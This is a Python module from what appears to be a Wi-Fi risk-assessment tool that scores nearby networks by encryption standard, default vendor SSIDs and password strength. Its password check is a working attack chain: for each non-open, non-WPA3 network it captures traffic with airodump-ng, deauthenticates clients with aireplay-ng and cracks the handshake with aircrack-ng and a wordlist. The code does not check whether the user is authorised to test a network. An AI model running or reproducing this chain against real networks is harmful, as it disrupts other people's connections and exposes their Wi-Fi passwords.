from core.config import IFACE, DEAUTH_COUNT, WORDLIST, AIRCRACK_TIMEOUT
import re
import subprocess
import time
import os 
import glob

BRANDS = ['TP-LINK', 'D-LINK', 'K-LINK', 'ASUS', 'Netgear', 'Huawei', 'Linksys', 'Mikrotik', 'Tenda', 'Zyxel', 'neterbit', 'netis', 'Zoltrix']
STANDARDS = {'WPA1': 6, 'WPA2': 3, 'WPA2 802.1X': 2, 'WPA3 802.1X': 2, 'WPA3': 1, 'WPA1 WPA2': 5, 'WPA2 WPA3': 2, 'WEP': 8, 'OPEN': 10}

def risk_standard(wifi):
    wifi['RISK 1'] = wifi['SECURITY'].map(STANDARDS).fillna(7)
    return wifi

def risk_default(wifi):
    wifi['RISK 2'] = 0
    for i in range(len(wifi)):
        for brand in BRANDS:
            pattern = re.findall(brand, wifi.loc[i,'SSID'], re.IGNORECASE)
            if pattern != []:
                wifi.loc[i, 'RISK 2'] += 2
                break
    return wifi

def risk_password(wifi):                
    wifi['RISK 3'] = 0
    for i in range(len(wifi)):
        if wifi.loc[i,'SECURITY'] == 'OPEN':
            wifi.loc[i, 'RISK 3'] = 13
            continue
        elif wifi.loc[i, 'SECURITY'] == 'WPA3':
            wifi.loc[i, 'RISK 3'] = 0
            continue

        if wifi.loc[i, 'CHAN'] is None:
            print(f"Skipping {wifi.loc[i, 'SSID']}: channel unknown")
            continue 

        cap_file = f"FILE{i+1}"
        airodump_proc = subprocess.Popen(["sudo", "airodump-ng", "-w", cap_file, "-c", str(wifi.loc[i,'CHAN']), "--bssid", wifi.loc[i,'BSSID'], IFACE],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL )
        time.sleep(30)

        subprocess.run(["sudo", "aireplay-ng", "-0", str(DEAUTH_COUNT),"-a", wifi.loc[i,'BSSID'], IFACE],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL )
        time.sleep(30)

        airodump_proc.terminate()
        try:
            airodump_proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            airodump_proc.kill()
        
        matching_files = sorted(glob.glob(f"{cap_file}-*.cap"))
        if not matching_files:
            print(f"No file created for {wifi.loc[i, 'SSID']}")
            continue

        cap_path = matching_files[-1]
        
        try:
            result = subprocess.run(
                ["sudo", "aircrack-ng", cap_path, "-w", WORDLIST],
                capture_output=True, text=True, timeout=AIRCRACK_TIMEOUT
            )
            output = result.stdout
        except subprocess.TimeoutExpired:
            print("Timeout occure for aircrack-ng!")
            output = ""

        if 'KEY FOUND' in output:
            wifi.loc[i, 'RISK 3'] = 8

        for f in glob.glob(f"{cap_file}-*"):
                    try:
                        os.remove(f)
                    except OSError as e:
                        print(f"Failed to remove {f}: {e}")
    
    return wifi

def total_risk(wifi):
    wifi["TOTAL RISK"] = wifi["RISK 1"] + wifi["RISK 2"] + wifi["RISK 3"]
    return wifi